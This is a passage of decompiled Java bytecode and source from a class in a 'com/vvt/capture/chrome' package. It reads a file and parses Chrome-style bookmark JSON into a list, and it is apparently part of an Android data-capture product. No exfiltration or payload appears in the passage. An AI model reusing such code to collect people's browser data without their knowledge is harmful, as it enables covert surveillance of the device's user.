    //   72: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   75: istore 6
    //   77: iload 6
    //   79: ifeq +3 -> 82
    //   82: aload_1
    //   83: ifnull +7 -> 90
    //   86: aload_1
    //   87: invokevirtual 258	java/io/BufferedReader:close	()V
    //   90: aload 5
    //   92: ifnull +8 -> 100
    //   95: aload 5
    //   97: invokevirtual 259	java/io/FileReader:close	()V
    //   100: aload_2
    //   101: invokevirtual 261	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   104: areturn
    //   105: astore 5
    //   107: iconst_0
    //   108: istore 6
    //   110: aconst_null
    //   111: astore_3
    //   112: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   115: istore 4
    //   117: iload 4
    //   119: ifeq +3 -> 122
    //   122: aload_3
    //   123: ifnull +7 -> 130
    //   126: aload_3
    //   127: invokevirtual 258	java/io/BufferedReader:close	()V
    //   130: aload_1
    //   131: ifnull -31 -> 100
    //   134: aload_1
    //   135: invokevirtual 259	java/io/FileReader:close	()V
    //   138: goto -38 -> 100
    //   141: astore 5
    //   143: goto -43 -> 100
    //   146: astore 5
    //   148: iconst_0
    //   149: istore 6
    //   151: aconst_null
    //   152: astore_3
    //   153: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   156: istore 4
    //   158: iload 4
    //   160: ifeq +3 -> 163
    //   163: aload_3
    //   164: ifnull +7 -> 171
    //   167: aload_3
    //   168: invokevirtual 258	java/io/BufferedReader:close	()V
    //   171: aload_1
    //   172: ifnull -72 -> 100
    //   175: aload_1
    //   176: invokevirtual 259	java/io/FileReader:close	()V
    //   179: goto -79 -> 100
    //   182: astore 5
    //   184: iconst_0
    //   185: istore 6
    //   187: aconst_null
    //   188: astore_3
    //   189: aload_3
    //   190: ifnull +7 -> 197
    //   193: aload_3
    //   194: invokevirtual 258	java/io/BufferedReader:close	()V
    //   197: aload_1
    //   198: ifnull +7 -> 205
    //   201: aload_1
    //   202: invokevirtual 259	java/io/FileReader:close	()V
    //   205: aload 5
    //   207: athrow
    //   208: astore_3
    //   209: goto -12 -> 197
    //   212: astore_1
    //   213: goto -8 -> 205
    //   216: astore_1
    //   217: goto -127 -> 90
    //   220: astore 5
    //   222: goto -92 -> 130
    //   225: astore 5
    //   227: goto -56 -> 171
    //   230: iconst_0
    //   231: istore 4
    //   233: aconst_null
    //   234: astore 5
    //   236: iconst_0
    //   237: istore 6
    //   239: aconst_null
    //   240: astore_3
    //   241: aload_3
    //   242: ifnull +7 -> 249
    //   245: aload_3
    //   246: invokevirtual 258	java/io/BufferedReader:close	()V
    //   249: aload 5
    //   251: ifnull -151 -> 100
    //   254: aload 5
    //   256: invokevirtual 259	java/io/FileReader:close	()V
    //   259: goto -159 -> 100
    //   262: astore_1
    //   263: goto -14 -> 249
    //   266: astore 7
    //   268: iconst_0
    //   269: istore 6
    //   271: aconst_null
    //   272: astore_3
    //   273: aload 5
    //   275: astore_1
    //   276: aload 7
    //   278: astore 5
    //   280: goto -91 -> 189
    //   283: astore 7
    //   285: aload 5
    //   287: astore_1
    //   288: aload 7
    //   290: astore 5
    //   292: goto -103 -> 189
    //   295: astore 7
    //   297: aload_1
    //   298: astore_3
    //   299: aload 5
    //   301: astore_1
    //   302: aload 7
    //   304: astore 5
    //   306: goto -117 -> 189
    //   309: astore 5
    //   311: goto -122 -> 189
    //   314: astore_3
    //   315: iconst_0
    //   316: istore 6
    //   318: aconst_null
    //   319: astore_3
    //   320: aload 5
    //   322: astore_1
    //   323: goto -170 -> 153
    //   326: astore_1
    //   327: aload 5
    //   329: astore_1
    //   330: goto -177 -> 153
    //   333: astore_3
    //   334: iconst_0
    //   335: istore 6
    //   337: aconst_null
    //   338: astore_3
    //   339: aload 5
    //   341: astore_1
    //   342: goto -230 -> 112
    //   345: astore_1
    //   346: aload 5
    //   348: astore_1
    //   349: goto -237 -> 112
    //   352: astore 5
    //   354: iconst_0
    //   355: istore 4
    //   357: aconst_null
    //   358: astore 5
    //   360: goto -288 -> 72
    //   363: astore_3
    //   364: goto -292 -> 72
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	367	0	paramString	String
    //   1	61	1	str	String
    //   69	1	1	localFileNotFoundException1	java.io.FileNotFoundException
    //   71	131	1	localObject1	Object
    //   212	1	1	localIOException1	java.io.IOException
    //   216	1	1	localIOException2	java.io.IOException
    //   262	1	1	localIOException3	java.io.IOException
    //   275	48	1	localObject2	Object
    //   326	1	1	localException1	Exception
    //   329	13	1	localObject3	Object
    //   345	1	1	localIOException4	java.io.IOException
    //   348	1	1	localObject4	Object
    //   5	96	2	localStringBuilder	StringBuilder
    //   13	181	3	localObject5	Object
    //   208	1	3	localIOException5	java.io.IOException
    //   240	59	3	localObject6	Object
    //   314	1	3	localException2	Exception
    //   319	1	3	localObject7	Object
    //   333	1	3	localIOException6	java.io.IOException
    //   338	1	3	localObject8	Object
    //   363	1	3	localFileNotFoundException2	java.io.FileNotFoundException
    //   23	333	4	bool1	boolean
    //   33	63	5	localFileReader	java.io.FileReader
    //   105	1	5	localIOException7	java.io.IOException
    //   141	1	5	localIOException8	java.io.IOException
    //   146	1	5	localException3	Exception
    //   182	24	5	localObject9	Object
    //   220	1	5	localIOException9	java.io.IOException
    //   225	1	5	localIOException10	java.io.IOException
    //   234	71	5	localObject10	Object
    //   309	38	5	localObject11	Object
    //   352	1	5	localFileNotFoundException3	java.io.FileNotFoundException
    //   358	1	5	localObject12	Object
    //   75	261	6	bool2	boolean
    //   266	11	7	localObject13	Object
    //   283	6	7	localObject14	Object
    //   295	8	7	localObject15	Object
    // Exception table:
    //   from	to	target	type
    //   51	55	69	java/io/FileNotFoundException
    //   61	66	69	java/io/FileNotFoundException
    //   10	13	105	java/io/IOException
    //   15	19	105	java/io/IOException
    //   19	23	105	java/io/IOException
    //   30	33	105	java/io/IOException
    //   37	41	105	java/io/IOException
    //   95	100	141	java/io/IOException
    //   134	138	141	java/io/IOException
    //   175	179	141	java/io/IOException
    //   254	259	141	java/io/IOException
    //   10	13	146	java/lang/Exception
    //   15	19	146	java/lang/Exception
    //   19	23	146	java/lang/Exception
    //   30	33	146	java/lang/Exception
    //   37	41	146	java/lang/Exception
    //   10	13	182	finally
    //   15	19	182	finally
    //   19	23	182	finally
    //   30	33	182	finally
    //   37	41	182	finally
    //   193	197	208	java/io/IOException
    //   201	205	212	java/io/IOException
    //   86	90	216	java/io/IOException
    //   126	130	220	java/io/IOException
    //   167	171	225	java/io/IOException
    //   245	249	262	java/io/IOException
    //   41	44	266	finally
    //   46	51	266	finally
    //   51	55	283	finally
    //   61	66	283	finally
    //   72	75	295	finally
    //   112	115	309	finally
    //   153	156	309	finally
    //   41	44	314	java/lang/Exception
    //   46	51	314	java/lang/Exception
    //   51	55	326	java/lang/Exception
    //   61	66	326	java/lang/Exception
    //   41	44	333	java/io/IOException
    //   46	51	333	java/io/IOException
    //   51	55	345	java/io/IOException
    //   61	66	345	java/io/IOException
    //   10	13	352	java/io/FileNotFoundException
    //   15	19	352	java/io/FileNotFoundException
    //   19	23	352	java/io/FileNotFoundException
    //   30	33	352	java/io/FileNotFoundException
    //   37	41	352	java/io/FileNotFoundException
    //   41	44	363	java/io/FileNotFoundException
    //   46	51	363	java/io/FileNotFoundException
  }
  
  private static ArrayList c(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    try
    {
      Object localObject1 = b(paramString);
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        if (i > 0)
        {
          Object localObject2 = new org/json/JSONObject;
          ((JSONObject)localObject2).<init>((String)localObject1);
          localObject1 = "roots";
          localObject1 = ((JSONObject)localObject2).get((String)localObject1);
          localObject1 = (JSONObject)localObject1;
          localObject2 = "synced";
          localObject1 = ((JSONObject)localObject1).get((String)localObject2);
          localObject1 = (JSONObject)localObject1;
          localObject2 = "children";
          localObject1 = ((JSONObject)localObject1).get((String)localObject2);
          localObject1 = (JSONArray)localObject1;
          int j = a;
          if (j != 0) {}
          j = 0;
          localObject2 = null;
          for (;;)
          {
            int m = ((JSONArray)localObject1).length();
            if (j >= m) {
              break;
            }
            JSONObject localJSONObject = ((JSONArray)localObject1).getJSONObject(j);
            ArrayList localArrayList2 = new java/util/ArrayList;
            localArrayList2.<init>();
            a(localJSONObject, localArrayList2);
            if (localArrayList2 != null)
            {
              int n = localArrayList2.size();
              if (n > 0) {
                localArrayList1.addAll(localArrayList2);
              }
            }
            int k;
            j += 1;
          }
        }
      }
      return localArrayList1;
    }
    catch (Exception localException)
    {
      bool = c;
      if (bool) {}
      bool = a;
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */